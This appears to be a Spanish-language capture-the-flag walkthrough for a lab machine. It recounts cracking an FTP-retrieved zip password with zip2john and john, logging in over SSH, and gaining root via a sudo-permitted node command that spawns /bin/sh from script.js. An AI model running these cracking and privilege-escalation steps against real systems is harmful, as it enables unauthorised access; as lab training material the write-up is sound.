nmap: 21,22

![image](https://github.com/user-attachments/assets/f278b033-4ada-4db4-bd22-f1b64aea118c)

vamos al ftp y nos pasamos el zip

![image](https://github.com/user-attachments/assets/e7fd669e-f52c-4af9-be43-554efac6afdb)

y nos pide contraseña

![image](https://github.com/user-attachments/assets/6b7ccde2-388d-42a7-9702-95da8b0c5a48)

ahora sacamos la contraseña con el comando

     zip2john secretitopicaron.zip

después 

     john has_zip


y da

![image](https://github.com/user-attachments/assets/f6956b23-3ba5-4d7d-9cb8-14159b066c1f)

ahora sacamos el zip

![image](https://github.com/user-attachments/assets/8dc71c63-1151-4a0a-94bb-e6827c905bbe)

y obtenemos la contraseña y usuario, entramos por el ssh, ahora entramos

![image](https://github.com/user-attachments/assets/26df6c64-9617-4635-acc5-895752ec119a)

al hacer sudo -l podemos ver que hay un archivo script.js pero no tiene nada dentro, pero igual esta el node

![image](https://github.com/user-attachments/assets/e6168389-fe56-423e-8d57-2c4f6d3da405)

buscamos el node: https://gtfobins.github.io/gtfobins/node/
dentro del script.js que esta vacío colocamos este comando

     require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]}) 

y ejecutamos el script

     sudo /usr/bin/node /home/mario/script.js

![[dockerlabs/facil/nodeclimb/root.png]]

y somos root!
